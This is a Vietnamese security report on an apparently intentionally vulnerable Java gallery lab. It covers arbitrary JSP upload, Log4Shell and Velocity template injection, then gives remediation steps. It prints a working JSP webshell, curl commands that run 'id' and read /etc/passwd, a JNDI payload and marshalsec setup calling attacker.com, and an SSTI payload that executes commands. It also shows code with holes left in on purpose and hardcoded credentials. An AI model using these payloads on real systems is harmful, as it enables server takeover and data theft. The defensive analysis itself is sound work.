# Báo cáo phân tích bảo mật ứng dụng Gallery

## Tổng quan dự án

Đây là một ứng dụng web Java Gallery cho phép người dùng xem và tải lên hình ảnh. Ứng dụng được triển khai bằng Docker Compose với các thành phần:

- **Nginx**: Reverse proxy với ModSecurity WAF
- **Tomcat**: Java servlet container chạy ứng dụng Gallery
- **MySQL**: Cơ sở dữ liệu lưu trữ thông tin ảnh

## Cấu trúc dự án

```
dangducloc-cd3/
├── docker-compose.yml                 # Orchestration cho 3 services: nginx, app, mysql
│
├── Data/                              # MySQL Database Setup
│   ├── dockerfile                     # MySQL 8.0 image
│   └── init.sql                       # Database schema + seed data (12 images)
│
├── Gallery/                           # Java Web Application (Tomcat)
│   ├── dockerfile                     # Multi-stage build (Maven + Tomcat)
│   ├── pom.xml                        # ⚠️ VULNERABLE: Log4j 2.14.1
│   │
│   └── src/main/
│       ├── java/
│       │   ├── Controller/
│       │   │   ├── Index.java         # ⚠️ SSTI + Log4Shell entry point
│       │   │   ├── Upload.java        # ⚠️ CRITICAL: Allows .jsp upload
│       │   │   └── VelocityHelper.java
│       │   │
│       │   ├── Model/
│       │   │  └── Img.java           # Image entity
│       │   │
│       │   └── Utils/
│       │       ├── DB_handler.java    # Database connection (hardcoded fallback)
│       │       └── Pool.java          # Database operations (PreparedStatement ✅)
│       │
│       ├── resources/
│       │   └── log4j2.xml             # Log4j configuration
│       │
│       └── webapp/
│           ├── linh.jsp               # Test JSP file
│           ├── imgs/                  # ⚠️ UPLOAD DIRECTORY (webroot)
│           │
│           └── WEB-INF/
│               ├── web.xml            # Servlet mapping
│               └── templates/
│                   ├── index.vm       # Velocity template (gallery view)
│                   └── upload.vm      # Velocity template (upload form)
│
└── Nginx/                             # Reverse Proxy + WAF
    ├── Dockerfile                     # owasp/modsecurity-crs:nginx-alpine
    ├── default.conf                   # Nginx proxy configuration
    │
    ├── custom/
    │   └── REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf  # ⚠️ Disables rules for /upload
    │
    └── ssl/
        ├── cert.pem                   # Self-signed SSL certificate
        └── key.pem                    # SSL private key
```

### Kiến trúc triển khai

```
┌─────────────────────────────────────────────────────────────┐
│                        Internet                              │
└────────────────────────┬────────────────────────────────────┘
                         │
                         ▼
              ┌──────────────────────┐
              │   Nginx (Port 443)   │
              │  + ModSecurity WAF   │
              │  + SSL Termination   │
              └──────────┬───────────┘
                         │
                         ▼
              ┌──────────────────────┐
              │  Tomcat (Port 8080)  │
              │   Java Servlets      │
              │   + Velocity Engine  │
              │   + Log4j 2.14.1 ⚠️  │
              └──────────┬───────────┘
                         │
                         ▼
              ┌──────────────────────┐
              │  MySQL (Port 3306)   │
              │   Database: imgs     │
              └──────────────────────┘
```

### Luồng hoạt động ứng dụng

```
User Request Flow:
==================

1. Browse Gallery (/)
   └─> Index.java
       └─> Pool.getAllImages() / searchImages()
           └─> MySQL query (PreparedStatement)
               └─> Render index.vm template
                   └─> Display images from /imgs/

2. Upload Image (/upload)
   └─> Upload.java (POST)
       ├─> Validate extension ⚠️ (.jsp allowed!)
       ├─> Generate MD5 filename
       ├─> Save to /webapp/imgs/ ⚠️ (executable location!)
       └─> Insert into MySQL
           └─> Redirect to gallery

3. Access Uploaded File
   └─> https://localhost/imgs/[filename].jsp
       └─> ⚠️ Tomcat executes JSP = RCE!
```

### Các file quan trọng cần chú ý

| File | Mô tả | Nguy cơ |
|------|-------|---------|
| `Upload.java` | Xử lý upload file | ⚠️ Cho phép upload .jsp |
| `Index.java` | Xử lý search & display | ⚠️ Log4Shell + SSTI |
| `pom.xml` | Maven dependencies | ⚠️ Log4j 2.14.1 vulnerable |
| `Exploit.java` | Demo exploit class | 💀 Ready-to-use RCE payload |
| `REQUEST-900-*.conf` | WAF rules | ⚠️ Disabled for /upload |
| `docker-compose.yml` | Service configuration | ⚠️ Hardcoded credentials |

## Các lỗ hổng bảo mật nghiêm trọng

### 1. **Arbitrary File Upload (CRITICAL)**

**Vị trí**: `Gallery/src/main/java/Controller/Upload.java` (dòng 74-78)

**Mô tả**: 
- Code cho phép upload file `.jsp` vào thư mục `webapp/imgs/`
- Thiếu kiểm tra Content-Type của file
- File JSP có thể được thực thi trực tiếp bởi Tomcat

**Code dễ bị tấn công**:
```java
// === LỖ HỔNG CHÍNH ===
// BỎ kiểm tra Content-Type để dễ bypass
// Và thêm .jsp vào whitelist extension → cho phép upload JSP shell
String ext = getFileExtension(submittedFileName).toLowerCase();
if (!ext.equals(".jpg") && !ext.equals(".jpeg") && !ext.equals(".png") &&
    !ext.equals(".gif") && !ext.equals(".webp") && !ext.equals(".jsp")) {
    resp.sendRedirect(req.getContextPath() + "/upload?error=Only jpg, png, gif, webp, jsp allowed");
    return;
}
```

**Cách khai thác**:
1. Tạo file JSP webshell (ví dụ: `shell.jsp`)
2. Upload qua form tại `/upload`
3. Truy cập `https://localhost/imgs/[filename].jsp` để thực thi code

**Ví dụ webshell**:
```jsp
<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>
```

**Tác động**: 
- Remote Code Execution (RCE)
- Chiếm quyền điều khiển server
- Đọc/ghi file hệ thống
- Lateral movement trong mạng nội bộ

---

### 2. **Log4Shell (CVE-2021-44228) - CRITICAL**

**Vị trí**: `Gallery/pom.xml` (dòng 31-41)

**Mô tả**:
- Sử dụng Log4j phiên bản 2.14.1 (dễ bị tấn công Log4Shell)
- Cho phép JNDI injection thông qua log messages

**Code dễ bị tấn công**:
```xml
<!-- ⚠️ VULNERABLE Log4j 2.14.1 (CVE-2021-44228) -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.14.1</version>
</dependency>

<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

**Điểm khai thác**: `Controller/Index.java` (dòng 32)
```java
if (searchQuery != null && !searchQuery.trim().isEmpty()) {
    images = pool.searchImages(searchQuery.trim());
    logger.info("Search query: {}", searchQuery);  // <-- VULNERABLE
}
```

**Payload khai thác**:
```
${jndi:ldap://attacker.com:1389/Exploit}
```

**Cách khai thác**:
1. Setup LDAP server độc hại trả về class `Exploit.class`
2. Gửi request: `/?search=${jndi:ldap://attacker.com:1389/Exploit}`
3. Log4j sẽ tải và thực thi class từ LDAP server

**Tác động**:
- Remote Code Execution
- Không cần authentication
- Bypass hầu hết các WAF truyền thống

---

### 3. **Server-Side Template Injection (SSTI) - HIGH**

**Vị trí**: `Gallery/src/main/java/Controller/Index.java`

**Mô tả**:
- Sử dụng Apache Velocity template engine
- Truyền user input trực tiếp vào Velocity context mà không sanitize

**Code dễ bị tấn công**:
```java
String searchQuery = req.getParameter("search");
// ...
VelocityContext context = new VelocityContext();
context.put("images", images);
context.put("searchQuery", searchQuery != null ? searchQuery : "");  // <-- VULNERABLE
```

Template `index.vm` (dòng 60):
```velocity
#if($searchQuery && $searchQuery != "")
<a href="/VulnApp" style="...">
    <i class="fas fa-times"></i> Clear
</a>
#end
```

**Payload khai thác**:
```
?search=#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('whoami'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**Tác động**:
- Remote Code Execution
- Đọc file nhạy cảm
- SSRF

---

### 4. **SQL Injection - MEDIUM**

**Vị trí**: Mặc dù code sử dụng PreparedStatement, nhưng vẫn có nguy cơ nếu input không được validate đúng cách.

**Đánh giá**: Code hiện tại KHÔNG bị SQL Injection vì đã dùng PreparedStatement:
```java
public ArrayList<Img> searchImages(String query) throws SQLException {
    String sql = "SELECT * FROM imgs WHERE name_by_user LIKE ?";
    PreparedStatement pre_sta = dbh.prepareStatement(sql);
    pre_sta.setString(1, "%" + query + "%");
    // ...
}
```

---

### 5. **Thông tin nhạy cảm trong code - LOW**

**Vị trí**: 
- `docker-compose.yml`: Database credentials hardcoded
- `Data/init.sql`: Default credentials
- `Gallery/src/main/java/Utils/DB_handler.java`: Fallback credentials

**Ví dụ**:
```yaml
environment:
  - DB_USER=linh
  - DB_PASSWORD=linh
  MYSQL_ROOT_PASSWORD: "linh"
```

---

## ModSecurity WAF Bypass

Mặc dù có cấu hình ModSecurity, nhưng các rule được disable cho endpoint `/upload`:

```conf
# Tắt rule block upload chung
SecRule REQUEST_URI "@beginsWith /upload" \
    "id:900006,\
     phase:1,\
     pass,\
     nolog,\
     ctl:ruleRemoveById=933110,\
     ctl:ruleRemoveById=944140"
```

WAF rules kiểm tra file extension và magic bytes, nhưng **KHÔNG ngăn chặn được file .jsp** vì application layer đã cho phép.

---

## Kịch bản tấn công thực tế

### Kịch bản 1: Upload JSP Webshell

```bash
# Bước 1: Tạo webshell
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<% 
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line=br.readLine())!=null) { out.println(line); }
%>
EOF

# Bước 2: Upload qua curl
curl -k -X POST https://localhost/upload \
  -F "image=@shell.jsp" \
  -F "customName=innocent_image"

# Bước 3: Execute commands
curl -k "https://localhost/imgs/[hash]_[timestamp].jsp?cmd=id"
curl -k "https://localhost/imgs/[hash]_[timestamp].jsp?cmd=cat%20/etc/passwd"
```

### Kịch bản 2: Log4Shell RCE

```bash
# Bước 1: Setup LDAP server với marshalsec
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \
  "http://attacker.com:8000/#Exploit" 1389

# Bước 2: Host Exploit.class
python3 -m http.server 8000

# Bước 3: Trigger payload
curl -k "https://localhost/?search=\${jndi:ldap://attacker.com:1389/Exploit}"
```

`Exploit.java` đã có sẵn trong code (Model/Exploit.java):
```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("gnome-calculator");
        } catch (Exception e) {}
    }
}
```

---

## Khuyến nghị khắc phục

### 1. File Upload Security (CRITICAL)

```java
// XÓA .jsp khỏi whitelist
String ext = getFileExtension(submittedFileName).toLowerCase();
if (!ext.equals(".jpg") && !ext.equals(".jpeg") && !ext.equals(".png") &&
    !ext.equals(".gif") && !ext.equals(".webp")) {
    resp.sendRedirect(req.getContextPath() + "/upload?error=Only image files allowed");
    return;
}

// THÊM kiểm tra Content-Type
String contentType = filePart.getContentType();
if (!contentType.startsWith("image/")) {
    resp.sendRedirect(req.getContextPath() + "/upload?error=Invalid content type");
    return;
}

// LƯU FILE VÀO THƯ MỤC NGOÀI WEBROOT
String uploadPath = "/var/uploads/images";  // Thay vì getServletContext().getRealPath("/imgs")

// RENAME FILE ĐỂ XÓA EXTENSION
String serverFileName = generateMD5(inputStream) + "_" + System.currentTimeMillis();  // Không có extension
```

### 2. Upgrade Log4j (CRITICAL)

```xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.17.1</version>  <!-- hoặc mới hơn -->
</dependency>

<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

**Hoặc** disable JNDI lookup:
```xml
<!-- log4j2.xml -->
<Configuration status="WARN">
    <Properties>
        <Property name="log4j2.formatMsgNoLookups">true</Property>
    </Properties>
    ...
</Configuration>
```

### 3. Template Injection Prevention (HIGH)

```java
// Sanitize user input trước khi đưa vào template
String searchQuery = req.getParameter("search");
if (searchQuery != null) {
    // Remove Velocity directives
    searchQuery = searchQuery.replaceAll("[#$]", "");
    // HTML encode
    searchQuery = StringEscapeUtils.escapeHtml4(searchQuery);
}
context.put("searchQuery", searchQuery != null ? searchQuery : "");
```

Hoặc sử dụng `#set` directive an toàn hơn trong template.

### 4. Secrets Management

```yaml
# docker-compose.yml
services:
  app:
    environment:
      - DB_USER_FILE=/run/secrets/db_user
      - DB_PASSWORD_FILE=/run/secrets/db_password
    secrets:
      - db_user
      - db_password

secrets:
  db_user:
    file: ./secrets/db_user.txt
  db_password:
    file: ./secrets/db_password.txt
```

### 5. WAF Configuration

```conf
# KHÔNG disable security rules cho upload endpoint
# Thay vào đó, config chính xác hơn:

SecRule FILES "@rx (?i)\.(jsp|jspx|php|asp|aspx|exe|sh)$" \
    "id:900100,\
     phase:2,\
     deny,\
     status:403,\
     msg:'Dangerous file extension blocked'"
```

### 6. Additional Security Headers

```conf
# Nginx config
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Content-Security-Policy "default-src 'self'" always;
```

### 7. Container Security

```dockerfile
# Không chạy với user root
USER tomcat

# Scan vulnerabilities
RUN apk add --no-cache trivy
RUN trivy filesystem --no-progress /

# Read-only filesystem
docker run --read-only --tmpfs /tmp ...
```

---

## Checklist kiểm tra bảo mật

- [ ] **File Upload**: Whitelist extension, validate content-type, magic bytes, lưu ngoài webroot
- [ ] **Dependencies**: Update Log4j >= 2.17.1
- [ ] **Input Validation**: Sanitize tất cả user input trước khi đưa vào template/SQL/log
- [ ] **Secrets**: Không hardcode credentials, dùng secrets management
- [ ] **WAF**: Không disable security rules cho critical endpoints
- [ ] **HTTPS**: Enforce HTTPS, HSTS headers
- [ ] **Container**: Run as non-root, scan vulnerabilities, least privilege
- [ ] **Logging**: Log security events, monitor suspicious activities
- [ ] **Backup**: Regular backups, disaster recovery plan

---

## Tổng kết mức độ nghiêm trọng

| Lỗ hổng | Mức độ | CVSS | Khả năng khai thác | Tác động |
|---------|--------|------|-------------------|----------|
| Arbitrary File Upload | **CRITICAL** | 9.8 | Dễ | RCE, Full compromise |
| Log4Shell CVE-2021-44228 | **CRITICAL** | 10.0 | Trung bình | RCE, Full compromise |
| Server-Side Template Injection | **HIGH** | 8.8 | Khó | RCE, Information disclosure |
| Hardcoded Credentials | **LOW** | 4.0 | Dễ | Unauthorized access |
| Disabled WAF Rules | **MEDIUM** | 6.5 | Dễ | Bypass security controls |

---

## Kết luận

Ứng dụng hiện tại có **3 lỗ hổng nghiêm trọng** cho phép Remote Code Execution:

1. ✅ **Arbitrary File Upload** (easiest to exploit)
2. ✅ **Log4Shell CVE-2021-44228** 
3. ⚠️ **Server-Side Template Injection** (requires crafted payload)

Tất cả đều có thể dẫn đến **full system compromise**. Cần ưu tiên khắc phục ngay lập tức theo thứ tự:

1. **Ngay lập tức**: Xóa `.jsp` khỏi whitelist upload và upgrade Log4j lên 2.17.1+
2. **Trong 24h**: Sanitize template input và thêm validation layers
3. **Trong tuần**: Implement secrets management và security headers
4. **Ongoing**: Security monitoring, regular audits, dependency scanning

---

**Người thực hiện phân tích**: Security Team  
**Ngày báo cáo**: December 26, 2025  
**Phiên bản ứng dụng**: Gallery 1.0-SNAPSHOT